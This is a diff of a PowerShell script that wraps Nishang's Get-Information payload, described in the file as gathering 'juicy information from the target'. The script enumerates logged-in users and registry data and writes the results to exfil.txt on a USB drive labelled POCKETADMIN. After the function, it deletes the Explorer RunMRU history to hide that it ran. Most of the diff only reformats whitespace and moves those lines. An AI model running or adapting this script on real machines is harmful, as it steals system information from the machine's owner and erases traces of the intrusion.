@@ -1,76 +1,42 @@
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
-$driveletter=(Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
-
-
 function Get-Information 
 
 {
 
 <#
-
 .SYNOPSIS
-
 Nishang Payload which gathers juicy information from the target.
-
-
-
 .DESCRIPTION
-
 This payload extracts information form registry and some commands. 
-
 The information available would be dependent on the privilege with which the script would be executed.
-
-
-
 .EXAMPLE
-
 PS > Get-Information
-
-
-
 Use above to execute the function.
-
-
-
 .LINK
-
 http://labofapenetrationtester.blogspot.com/
-
 https://github.com/samratashok/nishang
-
 #>
 
     [CmdletBinding()]
-
     Param ()
 
-
-
     function registry_values($regkey, $regvalue,$child) 
-
     { 
-
         if ($child -eq "no"){$key = get-item $regkey} 
-
         else{$key = get-childitem $regkey} 
 
         $key | 
 
         ForEach-Object { 
-
-        $values = Get-ItemProperty $_.PSPath 
-
-        ForEach ($value in $_.Property) 
-
-        { 
-
-        if ($regvalue -eq "all") {$values.$value} 
-
-        elseif ($regvalue -eq "allname"){$value} 
-
-        else {$values.$regvalue;break} 
-
-        }}} 
+          $values = Get-ItemProperty $_.PSPath 
+		  
+          ForEach ($value in $_.Property) 
+		  { 
+            if ($regvalue -eq "all") {$values.$value} 
+            elseif ($regvalue -eq "allname"){$value} 
+            else {$values.$regvalue;break} 
+          }
+		}
+	} 
 
     $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
 
@@ -114,5 +80,6 @@ https://github.com/samratashok/nishang
 
 }
 
-
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
+$driveletter=(Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
 Get-Information > ${driveletter}:\exfil.txt
